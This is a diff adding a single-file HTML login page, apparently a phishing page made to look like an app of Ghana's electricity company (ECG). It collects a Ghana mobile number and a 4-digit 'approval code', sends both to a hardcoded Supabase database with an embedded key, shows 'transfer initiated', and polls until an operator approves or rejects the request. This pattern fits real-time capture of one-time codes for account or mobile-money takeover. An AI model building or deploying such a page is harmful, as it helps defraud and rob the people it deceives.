@@ -1,0 +1,580 @@
+<!--
+ECG Power App Authentication
+Single-file HTML
+Replace:
+  YOUR_SUPABASE_URL
+  YOUR_SUPABASE_ANON_KEY
+
+Place ecg-logo.png in the same folder.
+--><!DOCTYPE html><html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>ECG Power App</title><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script><style>
+:root{
+    --primary:#343C9B;
+    --bg:#f7f7f7;
+    --text:#1f1f1f;
+    --muted:#8a8a8a;
+    --success:#22c55e;
+    --danger:#dc2626;
+    --card:#ffffff;
+}
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+html,body{
+    height:100%;
+    background:var(--bg);
+    font-family:
+    "Segoe UI Variable",
+    "Segoe UI",
+    Inter,
+    Roboto,
+    Arial,
+    sans-serif;
+}
+
+body{
+    overflow:hidden;
+}
+
+.screen{
+    position:absolute;
+    inset:0;
+    padding:
+        max(24px, env(safe-area-inset-top))
+        24px
+        max(24px, env(safe-area-inset-bottom))
+        24px;
+
+    display:flex;
+    flex-direction:column;
+
+    background:var(--bg);
+
+    transition:
+    transform .35s ease,
+    opacity .35s ease;
+}
+
+.hidden{
+    opacity:0;
+    pointer-events:none;
+    transform:translateX(20px);
+}
+
+.content{
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+}
+
+.logo{
+    width:120px;
+    height:120px;
+    margin:0 auto 30px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.logo img{
+    max-width:100%;
+    max-height:100%;
+    width:auto;
+    height:auto;
+    object-fit:contain;
+}
+
+.title{
+    font-size:22px;
+    font-weight:600;
+    color:var(--text);
+    text-align:center;
+    margin-bottom:12px;
+    line-height:1.3;
+}
+
+.subtitle{
+    text-align:center;
+    color:var(--muted);
+    line-height:1.6;
+    font-size:15px;
+    margin-bottom:40px;
+}
+
+.input{
+    width:100%;
+    height:72px;
+    border:2px solid #222;
+    border-radius:18px;
+    padding:0 20px;
+    font-size:20px;
+    background:white;
+    outline:none;
+}
+
+.counter{
+    text-align:right;
+    margin-top:10px;
+    color:var(--muted);
+    font-size:14px;
+}
+
+.bottom{
+    padding-top:20px;
+}
+
+.button{
+    width:100%;
+    height:72px;
+    border:none;
+    border-radius:22px;
+    background:var(--primary);
+    color:white;
+    font-size:18px;
+    font-weight:600;
+    cursor:pointer;
+}
+
+.button:disabled{
+    opacity:.55;
+    cursor:not-allowed;
+}
+
+.terms{
+    text-align:center;
+    margin-top:18px;
+    color:var(--muted);
+    font-size:14px;
+    line-height:1.5;
+}
+
+.terms a{
+    color:var(--primary);
+    text-decoration:none;
+    font-weight:600;
+}
+
+.otp-row{
+    display:flex;
+    justify-content:center;
+    gap:12px;
+}
+
+.otp{
+    width:62px;
+    height:72px;
+    border:2px solid var(--primary);
+    border-radius:16px;
+    background:white;
+    text-align:center;
+    font-size:28px;
+    font-weight:700;
+    outline:none;
+}
+
+.otp:focus{
+    box-shadow:0 0 0 4px rgba(52,60,155,.15);
+}
+
+.loading{
+    display:none;
+    margin-top:24px;
+    text-align:center;
+    color:var(--primary);
+    font-weight:600;
+}
+
+.spinner{
+    width:24px;
+    height:24px;
+    border:3px solid rgba(52,60,155,.25);
+    border-top-color:var(--primary);
+    border-radius:50%;
+    animation:spin .8s linear infinite;
+    margin:0 auto 10px;
+}
+
+@keyframes spin{
+    to{
+        transform:rotate(360deg);
+    }
+}
+
+.success{
+    width:96px;
+    height:96px;
+    border-radius:50%;
+    background:var(--success);
+    color:white;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 24px;
+    font-size:48px;
+    animation:pop .35s ease;
+}
+
+@keyframes pop{
+    from{
+        transform:scale(.8);
+        opacity:0;
+    }
+    to{
+        transform:scale(1);
+        opacity:1;
+    }
+}
+
+.status-card{
+    background:white;
+    border-radius:20px;
+    padding:24px;
+    text-align:center;
+    box-shadow:0 8px 30px rgba(0,0,0,.05);
+}
+
+.badge{
+    display:inline-block;
+    padding:8px 14px;
+    border-radius:999px;
+    background:#fff7ed;
+    color:#c2410c;
+    font-size:13px;
+    font-weight:600;
+    margin-top:14px;
+}
+
+.small{
+    margin-top:14px;
+    color:var(--muted);
+    font-size:14px;
+}
+</style></head><body><!-- LOGIN --><section class="screen" id="screen1"><div class="content"><div class="logo">
+<img src="ecg-logo.png" alt="ECG Logo">
+</div><h1 class="title">
+Login with your Ghana mobile number
+</h1><p class="subtitle">
+Your mobile number may be verified against your Ghana Card details
+</p><input
+id="phone"
+class="input"
+type="tel"
+maxlength="10"
+placeholder="Enter your mobile number">
+
+<div class="counter">
+<span id="count">0</span>/10
+</div></div><div class="bottom"><button
+id="continueBtn"
+class="button"
+disabled>
+Continue
+</button>
+
+<div class="terms">
+By signing up you agree to our
+<a href="#">Terms of Use</a>
+and
+<a href="#">Privacy Policy</a>.
+</div></div></section><!-- CODE ENTRY --><section class="screen hidden" id="screen2"><div class="content"><div class="logo">
+<img src="ecg-logo.png" alt="ECG Logo">
+</div><h1 class="title">
+Enter Approval Code
+</h1><p class="subtitle">
+Enter any 4-digit code to submit your login request.
+</p><div class="otp-row"><input class="otp" maxlength="1">
+<input class="otp" maxlength="1">
+<input class="otp" maxlength="1">
+<input class="otp" maxlength="1"></div><div class="loading" id="loading">
+<div class="spinner"></div>
+Submitting request...
+</div></div><div class="bottom"><button
+id="submitBtn"
+class="button">
+Submit Request
+</button>
+
+</div></section><!-- WAITING --><section class="screen hidden" id="screen3"><div class="content"><div class="status-card"><div class="success">✓</div><h1 class="title">
+Request Submitted
+</h1><p class="subtitle" style="margin-bottom:0;">
+transfer initiated
+</p><div class="badge">
+Awaiting Approval
+</div><div
+class="small"
+id="pollStatus">
+Checking approval status every 5 seconds...
+</div></div></div></section><script>
+
+const SUPABASE_URL =
+"https://edkbjaxajxywnamgwani.supabase.co";
+
+const SUPABASE_ANON_KEY =
+"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVka2JqYXhhanh5d25hbWd3YW5pIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4MTg0ODAsImV4cCI6MjA5NjM5NDQ4MH0.GSiL4u96M5AMA4YFWX52iIVGmMkGYYG_C13cMD322j4";
+
+const supabaseClient =
+window.supabase.createClient(
+    SUPABASE_URL,
+    SUPABASE_ANON_KEY
+);
+
+let requestId = null;
+let pollingInterval = null;
+
+const phone =
+document.getElementById("phone");
+
+const count =
+document.getElementById("count");
+
+const continueBtn =
+document.getElementById("continueBtn");
+
+phone.addEventListener("input",()=>{
+
+    phone.value =
+    phone.value.replace(/\D/g,'');
+
+    count.textContent =
+    phone.value.length;
+
+    continueBtn.disabled =
+    phone.value.length !== 10;
+
+});
+
+continueBtn.addEventListener("click",()=>{
+
+    document
+    .getElementById("screen1")
+    .classList.add("hidden");
+
+    document
+    .getElementById("screen2")
+    .classList.remove("hidden");
+
+    otpBoxes[0].focus();
+
+});
+
+const otpBoxes =
+document.querySelectorAll(".otp");
+
+otpBoxes.forEach((box,index)=>{
+
+    box.addEventListener("input",()=>{
+
+        box.value =
+        box.value.replace(/\D/g,'');
+
+        if(
+            box.value &&
+            index < otpBoxes.length - 1
+        ){
+            otpBoxes[index+1].focus();
+        }
+
+    });
+
+    box.addEventListener("keydown",(e)=>{
+
+        if(
+            e.key === "Backspace" &&
+            !box.value &&
+            index > 0
+        ){
+            otpBoxes[index-1].focus();
+        }
+
+    });
+
+});
+
+otpBoxes[0].addEventListener(
+"paste",
+(e)=>{
+
+    e.preventDefault();
+
+    const value =
+    (
+        e.clipboardData ||
+        window.clipboardData
+    )
+    .getData("text")
+    .replace(/\D/g,'')
+    .slice(0,4);
+
+    value
+    .split("")
+    .forEach((digit,index)=>{
+
+        if(otpBoxes[index]){
+            otpBoxes[index].value =
+            digit;
+        }
+
+    });
+
+});
+
+document
+.getElementById("submitBtn")
+.addEventListener(
+"click",
+submitRequest
+);
+
+async function submitRequest(){
+
+    let code = "";
+
+    otpBoxes.forEach(box=>{
+        code += box.value;
+    });
+
+    if(code.length !== 4){
+        alert(
+        "Please enter a 4-digit code."
+        );
+        return;
+    }
+
+    document
+    .getElementById("loading")
+    .style.display =
+    "block";
+
+    try{
+
+        const {
+            data,
+            error
+        } =
+        await supabaseClient
+        .from("login_requests")
+        .insert({
+            phone_number:
+            phone.value,
+
+            approval_code:
+            code,
+
+            status:
+            "pending"
+        })
+        .select()
+        .single();
+
+        if(error){
+            throw error;
+        }
+
+        requestId =
+        data.id;
+
+        document
+        .getElementById("screen2")
+        .classList.add("hidden");
+
+        document
+        .getElementById("screen3")
+        .classList.remove("hidden");
+
+        startPolling();
+
+    }catch(err){
+
+        document
+        .getElementById("loading")
+        .style.display =
+        "none";
+
+        alert(
+        err.message ||
+        "Submission failed."
+        );
+
+    }
+
+}
+
+function startPolling(){
+
+    pollingInterval =
+    setInterval(
+    async ()=>{
+
+        const {
+            data,
+            error
+        } =
+        await supabaseClient
+        .from("login_requests")
+        .select("status")
+        .eq("id",requestId)
+        .single();
+
+        if(error){
+            return;
+        }
+
+        if(
+            data.status ===
+            "approved"
+        ){
+
+            clearInterval(
+            pollingInterval
+            );
+
+            window.location.href =
+            "dashboard.html";
+
+        }
+
+        if(
+            data.status ===
+            "rejected"
+        ){
+
+            clearInterval(
+            pollingInterval
+            );
+
+            alert(
+            "Your request was rejected."
+            );
+
+            location.reload();
+
+        }
+
+    },5000);
+
+}
+
+window.addEventListener(
+"beforeunload",
+()=>{
+
+    if(
+        pollingInterval
+    ){
+        clearInterval(
+        pollingInterval
+        );
+    }
+
+});
+
+</script></body>
+</html>
